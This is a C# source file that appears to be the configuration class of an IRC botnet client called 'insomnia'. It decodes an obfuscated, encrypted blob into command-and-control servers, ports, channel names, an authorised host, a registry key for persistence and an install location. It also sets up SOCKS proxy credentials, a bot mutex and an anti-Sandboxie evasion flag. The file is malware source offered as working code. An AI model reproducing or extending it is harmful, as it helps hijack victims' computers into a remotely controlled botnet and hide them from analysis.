using System;
using System.Collections.Generic;
using System.Text;
using System.Diagnostics;
using System.Threading;
using Microsoft.Win32;
using System.Resources;
using System.Reflection;

namespace insomnia
{
    internal class Config
    {
        public static string currentPath = Process.GetCurrentProcess().MainModule.FileName;
        public static string randomID = Functions.RandomString(7);
        public static string botNick = Functions.BotNick();
        public static string botMD5 = Functions.GetMD5Hash(currentPath);
        public static string version = "2.2.0";
        public static string regLocation = "HKCU";
        public static string socksUser = randomID;
        public static string socksPass = Convert.ToBase64String(Encoding.UTF8.GetBytes(randomID)).Substring(0, 5);
        public static bool topicAct = false;

        public static Mutex mutex;
        public static string BotMutex()
        {
            string encoded = Convert.ToBase64String(Encoding.UTF8.GetBytes(botMD5));
            return encoded.Substring(0, encoded.Length / 2);
        }

        private static string enc = "OTMxMDI0NzVOcnlYW0VSPVBIKWJ2PnY9OGFRO19URWJyO34+cEZSPS9jP0pCSiVKPEszY0ZjOV9ZWHpFej1wSDpjKmM7X2lRelR+Q3U/PmNIX3xReFRZQ1A/N2NXR+qHl0N5S1JAVT1XUlNFaUNuPnZFImMyN0xBd1dUWHBHeEwkMS5jJj0sQC1AZTd1MUo5czJYMVI0WTIxQ0U6OEUkQCU5K2NTWG5SVld0R0NjbFhQUmtXc1g=";
        private static string toParse = Encoding.UTF8.GetString(Convert.FromBase64String(enc));
        public static string customerID = toParse.Substring(0, 8);
        private static string[] nfo = Functions.Chk(new Data().decrypt(toParse.Remove(0,8)), Convert.ToInt32(customerID)).Split('/');
        
        public static string[] _servers()
        {
            if (nfo[0].Contains("&"))
            {
                string[] server = nfo[0].Split('&');
                return server;
            }
            else return new string[] { nfo[0] };
        }

        public static int[] _port()
        {
            if (nfo[1].Contains("&"))
            {
                int count = 0;
                string[] ports = nfo[1].Split('&');
                int[] p = new int[ports.Length];

                foreach (string s in ports)
                {
                    try
                    {
                        p[count] = Convert.ToInt32(s);
                        count++;
                    }
                    catch
                    {
                    }
                }
                return p;
            }
            else return new int[] { Convert.ToInt32(nfo[1]) };
        }

        public static string _password()
        {
            return nfo[2];
        }

        public static string _mainChannel()
        {
            return nfo[3];
        }

        public static string _key()
        {
            return nfo[4];
        }

        public static string _bkChan()
        {
            return nfo[5];
        }

        public static string _rkChan()
        {
            return nfo[6];
        }

        public static string _authHost()
        {
            return nfo[7];
        }

        public static string _registryKey()
        {
            if (nfo[8] != "[Mutex]")
                return nfo[8];
            else
                return BotMutex();
        }

        public static string _installEnv()
        {
            return nfo[9];
        }

        public static bool _colors()
        {
            if (nfo[10] == "true")
                return true;
            else
                return false;
        }

        public static bool _antiSandboxie()
        {
            if (nfo[11] == "true")
                return true;
            else
                return false;
        }
    } 
}